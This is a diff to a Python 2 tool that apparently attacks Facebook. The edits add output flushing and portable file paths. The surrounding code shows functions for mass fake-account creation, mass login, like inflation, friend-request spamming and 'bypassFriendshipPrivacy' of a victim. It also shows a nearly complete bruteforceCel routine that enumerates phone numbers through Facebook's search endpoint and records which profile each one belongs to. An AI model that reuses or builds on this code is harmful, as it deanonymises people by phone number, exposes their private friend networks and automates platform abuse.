@@ -1,4 +1,5 @@
 import sys,os
+from platform import system
 from getpass import getpass
 from mainLib import *
 import MyParser 
@@ -23,6 +24,10 @@ from selenium.webdriver.common.keys import Keys
 
 blocked = 0
 masterCj = ''
+
+def flush():
+    if system() == 'Linux':
+        sys.stdout.flush()
 
 def setGlobalLogginng():
     global globalLogging
@@ -166,6 +171,7 @@ def createUser(number):
             userRaw.append(str(response.read()))
             
             percentage = (i * 100.0) / int(number)
+            flush()
             print '\rCompleted [%.2f%%]\r'%percentage,
             sleep(60)
         except mechanize.HTTPError as e:
@@ -295,6 +301,7 @@ def massLogin():
         #percentage
         i+=1
         percentage = (i * 100.0) / len(people)
+        flush()
         print '\rCompleted [%.2f%%]\r'%percentage,
         if rsp == -1:
             database.removeTestUsers(person[0])
@@ -435,6 +442,7 @@ def sendRequestToList(victim):
                     #percentage
                     percentage = (i * 100.0) / len(friends)
                     i+=1
+                    flush()
                     print '\rCompleted [%.2f%%]\r'%percentage,
                             
                     if globalLogging:
@@ -589,6 +597,7 @@ def like(postId, quantity):
                                 logs(response.read())
                             
                             percentage = (j * 100.0)/total
+                            flush()
                             print '\r[%.2f%%] of likes completed\r' %(percentage), 
                             j+=1
                                 
@@ -1394,6 +1403,7 @@ def analyzeGraph(victim):
                 userNames.append(user)
                 nodekeys[idkeys[elements]] = user
                 percentage = (i * 100.0)/len(idkeys.keys())
+                flush()
                 print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(idkeys.keys()), percentage), 
                 i+=1
             except:
@@ -1594,7 +1604,7 @@ def bypassFriendshipPrivacyPlot(victim, transitive):
     for friends in friendships:
         #Percentage calculus 
         percentage = (i * 100.0)/len(friendships)
-        
+        flush()
         print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
         i+=1
         #Only if the node wasn't visited 
@@ -1719,6 +1729,7 @@ def bypassFriendshipPrivacy(victim, transitive):
     for friends in friendships:
         #Percentage calculus 
         percentage = (i * 100.0)/len(friendships)
+        flush()
         print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
         i+=1
         #Only if the node wasn't visited 
@@ -1878,8 +1889,7 @@ def simpleGraph(friends, victim):
                 myGraph.add_edge(element, friend)
         
     friendshipFile.close()
-    
-    mkdir('objects',root+'\\'+directory)
+    mkdir('objects', os.path.join(root,directory))
     
     A = nx.adj_matrix(myGraph)
     saveObjects(victim, A, coleccion)
@@ -1908,7 +1918,8 @@ def friendshipPlot(text,victim):
                 if fbid is not -1:
                     friendsID.append(fbid)
                     count += 1
-                    print "Friends enumerated: %d" %count
+                    flush()
+                    print "\rFriends enumerated: %d" %count,
             text = text[matchEnd.start()+start:]
         else:
             try:
@@ -2134,7 +2145,7 @@ def dotFile(victim, transitive):
     for friends in friendships:
         #Percentage calculus 
         percentage = (i * 100.0)/len(friendships)
-        
+        flush()
         print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
         i+=1
         #Only if the node wasn't visited 
@@ -2497,6 +2508,7 @@ def likeDev(postId):
                         logs(response.read())
                     
                     percentage = (j * 100.0)/total
+                    flush()
                     print '\r[%.2f%%] of likes completed\r' %(percentage), 
                     j+=1
                         
@@ -2664,6 +2676,7 @@ def massLoginTest():
             #percentage
             i+=1
             percentage = (i * 100.0) / len(people)
+            flush()
             print '\rCompleted [%.2f%%]\r'%percentage,
         except:
             print 'Error with user %s' %person[0]
@@ -2746,7 +2759,7 @@ def dotFileDatabase(victim, transitive):
     for friends in friendships:
         #Percentage calculus 
         percentage = (i * 100.0)/len(friendships)
-        
+        flush()
         print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
         i+=1
         #Only if the node wasn't visited 
@@ -3128,15 +3141,16 @@ def steal():
 def bruteforceCel(first,start,end):
     c_user = getC_user()
     try:
-        f = open('cellphones\\cellphones.txt','a')
+        f = open( os.path.join("cellphones","cellphones.txt"),"a" )
         f.close()
     except:
-        f = open('cellphones\\cellphones.txt','wb')
+        f = open( os.path.join("cellphones","cellphones.txt"),"wb" )
         f.close()
     percentage = 0.0
     verified = 0
     for cellphone in range(int(start),int(end)):
         percentage = ((cellphone-int(start)) * 100.0) / (int(end) - int(start))
+        flush()
         print '\rCompleted [%.6f%%] - %d cellphone - %d verified\r' %(percentage, cellphone, verified),
         try:
             response = br.open('https://www.facebook.com/typeahead/search/facebar/query/?value=["'+first+str(cellphone)+'"]&context=facebar&grammar_version=7466c20ac89f47d6185f3a651461c1b1bac9a82d&content_search_mode&viewer='+c_user+'&rsp=search&qid=8&max_results=10&sid=0.24097281275317073&__user='+c_user+'&__a=1&__dyn=7nmajEyl2qm9udDgDxyIGzGpUW9ACxO4p9GgyimEVFLFwxBxCbzESu49UJ6K59poW8xHzoyfw&__req=1o&__rev=1536505')
@@ -3145,7 +3159,7 @@ def bruteforceCel(first,start,end):
             #print str(json_dump['payload']['entities'][0]['path'])
             #print str(json_dump['payload']['entities'][0]['uid'])
             #print first + str(cellphone)
-            f = open('cellphones\\cellphones.txt','a')
+            f = open( os.path.join("cellphones","cellphones.txt"),"a" )
             f.write(first + str(cellphone)+' '+str(json_dump['payload']['entities'][0]['path']) + ' ' + str(json_dump['payload']['entities'][0]['uid'])+'\n')
             f.close()
             verified += 1
